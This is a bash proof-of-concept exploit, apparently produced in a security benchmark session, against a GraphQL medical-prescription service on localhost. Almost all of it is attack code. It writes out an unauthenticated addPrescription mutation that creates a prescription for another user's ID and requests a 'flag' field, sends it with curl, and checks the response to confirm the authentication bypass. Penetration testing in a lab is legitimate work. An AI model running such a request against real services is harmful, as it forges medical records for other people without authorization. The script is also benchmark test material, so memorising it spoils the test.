#!/bin/bash
# POC: Demonstrates unauthenticated access to GraphQL addPrescription mutation, allowing arbitrary prescription creation without authentication or authorization
# Target: ./repo
# Created: 2025-11-10T19:41:00.362Z
# Session: benchmark-XBEN-007-24-mhtjlewb

# GraphQL Authentication Bypass POC - addPrescription Mutation
# Demonstrates unauthenticated access to create prescriptions for any userId
# Target: http://localhost:5003/graphql

TARGET_URL="http://localhost:5003/graphql"
CONTENT_TYPE="application/json"

echo "[*] GraphQL Authentication Bypass - addPrescription Mutation POC"
echo "[*] Target: $TARGET_URL"
echo ""

# Test 1: Create prescription for userId 2 without authentication
echo "[TEST 1] Creating prescription for userId 2 (unauthenticated)"
echo "---"

# Build proper JSON payload with correct escaping
cat > /tmp/graphql_payload.json <<'EOF'
{
  "query": "mutation { addPrescription(userId: 2, prescriptionDetails: \"Unauthorized Test Prescription\") { prescription { id userId prescriptionDetails flag } } }"
}
EOF

echo "Request:"
echo "  POST $TARGET_URL"
echo "  Payload:"
cat /tmp/graphql_payload.json
echo ""
echo "Response:"

RESPONSE=$(curl -s -X POST "$TARGET_URL" \
  -H "Content-Type: $CONTENT_TYPE" \
  -d @/tmp/graphql_payload.json)

echo "$RESPONSE" | jq . 2>/dev/null || echo "$RESPONSE"
echo ""

# Check if prescription was created
if echo "$RESPONSE" | grep -q '"id":'; then
  PRESCRIPTION_ID=$(echo "$RESPONSE" | jq -r '.data.addPrescription.prescription.id' 2>/dev/null)
  RETURNED_USERID=$(echo "$RESPONSE" | jq -r '.data.addPrescription.prescription.userId' 2>/dev/null)
  PRESCRIPTION_DETAILS=$(echo "$RESPONSE" | jq -r '.data.addPrescription.prescription.prescriptionDetails' 2>/dev/null)
  
  echo "[+] SUCCESS: Prescription created without authentication!"
  echo "    - Prescription ID: $PRESCRIPTION_ID"
  echo "    - Created for userId: $RETURNED_USERID"
  echo "    - Details: $PRESCRIPTION_DETAILS"
  echo ""
  echo "[!] VULNERABILITY CONFIRMED: Authentication bypass on addPrescription mutation"
  rm -f /tmp/graphql_payload.json
  exit 0
else
  echo "[-] FAILED: Could not create prescription or unexpected response"
  rm -f /tmp/graphql_payload.json
  exit 1
fi